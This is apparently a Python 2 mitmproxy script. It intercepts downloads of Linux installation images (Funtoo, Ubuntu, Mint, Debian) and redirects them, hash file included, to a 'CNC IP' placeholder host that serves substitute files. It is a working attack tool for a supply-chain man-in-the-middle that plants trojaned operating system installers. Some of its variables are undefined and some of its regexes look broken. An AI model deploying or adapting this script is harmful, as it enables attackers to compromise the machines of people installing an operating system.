"""
Copyright terabit 2016
Copyright kaneda  2016

301 redirect iso and stage3 downloads
poc.sh should replace REPLACEME with user specified CNC IP
TODO fix the need to use ports other than 80 (81 in this case)
"""
from netlib.http import Headers
import re
import sys

# The print statements make this incompatible with Python 3
if sys.version_info >= (3, 0):
    sys.stdout.write("Sorry, requires Python 2.x, not Python 3.x\n")
    sys.exit(1)

def header_factory(location, content_type):
    return Headers([
        [b"Location", bytes(location)],
        [b"Content-Type", bytes(content_type)]
    ])

h_funtoo_iso = header_factory("http://REPLACEME:81/systemrescuecd-x86-4.7.1.iso", "application/x-iso9660-image")

h_funtoo_stage3 = header_factory("http://REPLACEME:81/stage3-latest.tar.xz", "application/octet-stream")
h_funtoo_hash  = header_factory("http://REPLACEME:81/stage3-latest.tar.xz.hash.txt","text/plain")

download_map = {
    "Funtoo ISO": [".*\/distfiles\/sysresccd\/systemrescuecd-x86-.*\.iso", h_funtoo_iso],
    "Funtoo stage3": [".*\/funtoo-current\/.*\/stage3.*xz", h_funtoo_stage3],
    "Funtoo Hash" :  [".*stage3-latest\.tar\.xz\.hash\.txt", h_funtoo_hash],
    "Ubuntu 14 Desktop"  :  [".*ubuntu-14\.*-desktop-amd64\.iso", h_ubuntu_desktop_iso],
    "Ubuntu 14 Server"  :  [".*ubuntu-14\.-server-amd64\.iso", h_ubuntu_server_iso],
    "Mint 17 Rosa - Cinnamon" : [".*linuxmint-17\..*-cinnamon-64bit\.iso", h_mint_rosa_iso],
    "Debian 8.4 net install" : [".*debian-8\.4\.0-amd64-netinst\.iso", h_debian_netinst_iso]
    
}

def set_flow_response(flow, headers):
    flow.response.content=""
    flow.response.status_code = 301
    flow.response.msg = "Moved Permanently"
    flow.response.headers = headers

def response(context, flow):
    print flow.request
    for download, info in download_map.items():
        if re.match(info[0], flow.request.url) is not None:
            print "{0} download...redirecting!".format(download)
            set_flow_response(flow, info[1])

def request(context, flow):
    print flow.request

